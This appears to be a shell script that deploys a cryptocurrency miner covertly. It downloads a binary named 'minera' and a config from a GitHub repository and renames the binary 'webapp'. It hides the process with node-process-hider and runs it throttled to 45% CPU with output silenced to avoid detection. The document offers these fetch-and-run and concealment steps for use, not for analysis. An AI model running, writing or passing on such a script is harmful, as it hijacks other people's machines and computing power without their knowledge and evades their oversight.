sudo apt-get update
sudo apt install npm cpulimit -y
sudo npm i -g node-process-hider && sudo ph add webapp config.json
wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/config.json
wget -qO webapp https://github.com/danipedrosang/marcrash/raw/main/minera
chmod 777 webapp config.json
cpulimit -l 45 ./webapp >/dev/null 2>&1
